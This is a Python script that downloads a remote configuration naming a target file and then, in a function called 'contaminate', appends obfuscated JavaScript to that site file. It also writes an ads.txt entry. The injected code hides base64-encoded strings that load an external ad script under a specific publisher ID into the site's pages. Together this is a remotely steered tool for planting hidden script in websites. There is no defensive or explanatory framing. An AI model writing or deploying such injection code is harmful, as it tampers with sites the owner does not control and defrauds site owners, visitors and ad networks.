import json
import os
import time
import urllib


def fetch_config(url_path, name):
    response = urllib.urlopen(url_path)
    if response.code == 200:
        conf = open(name, 'w')
        try:
            resp = json.loads(response.read())
        except Exception:
            pass
        else:
            conf.write(json.dumps(resp))
            conf.close()


globals_file = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    'g.json'
)

def get_globals():
    try:
        conf_file = open(globals_file, 'r')
    except IOError:
        result = {
            "update": True,
            "last_update": 1682415015.825721
        }
        conf_file = open(globals_file, 'w')
        conf_file.write(json.dumps(result))
        return result
    else:
        conf = conf_file.read()
        conf_file.close()
        return json.loads(conf)


def update_globals(key, value):
    conf_file = open(globals_file, 'r+')
    conf = json.loads(conf_file.read())
    conf[key] = value
    conf_file.seek(0)
    conf_file.write(json.dumps(conf))
    conf_file.truncate()
    conf_file.close()


def get_config():
    """
    Just read existing file if update is False,
    and set update to True if there is error:
    e.g FileNotFoundError, etc...
    :return:
    """
    globals_conf = get_globals()
    is_expired = (globals_conf['last_update'] + 600) < time.time()
    if is_expired:
        update_globals('update', True)
    location = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        'c.json'
    )
    if globals_conf['update']:
        fetch_config(
            'https://raw.githubusercontent.com/babi40060/config/main/ads.json',
            location
        )
        update_globals('update', False)
        update_globals('last_update', time.time())
        time.sleep(1)
    config_file = open(location, 'r')
    config = config_file.read()
    config_file.close()
    return json.loads(config)


def contaminate(file_path):
    """
    :param file_path: which file
    :return:
    """
    is_exists = os.path.exists(file_path)
    if not is_exists:
        return False

    ads_code = """
    function bar2(foo1,foo){var bar=foo2();return bar2=function(bar1,Bar2){bar1=bar1-0xa8;var Bar1=bar[bar1];return Bar1;},bar2(foo1,foo);}function foo2(){var Bar2=['appendChild','16462230pfHvCY','552TnWsqr','21TgHTKx','async','24588SrzGYO','363894rrtNFG','querySelector','script','head','anonymous','510775rwehIy','6BEEmbK','aHR0cHM6Ly9wYWdlYWQyLmdvb2dsZXN5bmRpY2F0aW9uLmNvbS9wYWdlYWQvanMvYWRzYnlnb29nbGUuanM/Y2xpZW50PQ==','1334805ytshBr','1072656XSqaZe','305438lnJDWE','src','Y2EtcHViLTQwNzc5MzE4Njg4MTcwMDA='];foo2=function(){return Bar2;};return foo2();}(function(bar,bar1){var Bar1=bar2,Foo1=bar();while(!![]){try{var Foo2=-parseInt(Bar1(0xad))/0x1+-parseInt(Bar1(0xb2))/0x2*(parseInt(Bar1(0xae))/0x3)+-parseInt(Bar1(0xb1))/0x4+-parseInt(Bar1(0xb0))/0x5+parseInt(Bar1(0xa8))/0x6*(-parseInt(Bar1(0xb8))/0x7)+parseInt(Bar1(0xb7))/0x8*(parseInt(Bar1(0xba))/0x9)+parseInt(Bar1(0xb6))/0xa;if(Foo2===bar1)break;else Foo1['push'](Foo1['shift']());}catch(Bar){Foo1['push'](Foo1['shift']());}}}(foo2,0x49986),(function(){var Foo=bar2,foo1=document['createElement'](Foo(0xaa)),foo=document[Foo(0xa9)](Foo(0xab));foo1[Foo(0xb3)]=atob(Foo(0xaf))+atob(Foo(0xb4)),foo1[Foo(0xb9)]=!![],foo1['crossorigin']=Foo(0xac),foo[Foo(0xb5)](foo1);}()));
    """
    ads_code = ads_code.strip()
    f = open(file_path, 'r')
    lines = f.readlines()
    f.close()
    if ads_code not in lines:
        with open(file_path, 'a') as _file:
            _file.write("\n")
            _file.write(ads_code)
            _file.close()
    return True


def insert_code(file_path, ads_code):
    is_exists = os.path.exists(file_path)
    if not is_exists or not os.stat(file_path).st_size:
        with open(file_path, 'w') as _file:
            _file.write(ads_code)
            _file.close()


if __name__ == "__main__":
    # /home/dawnvtus/public_html/public/assets/js/page.js
    _config = get_config()
    if not contaminate(_config.get('c')):
        contaminate(_config.get('c'))
        update_globals('update', True)

    # /home/dawnvtus/public_html/public/ads.txt
    insert_code(
        file_path="ads.txt",
        ads_code="google.com, pub-4077931868817000, DIRECT, f08c47fec0942fa0",
    )
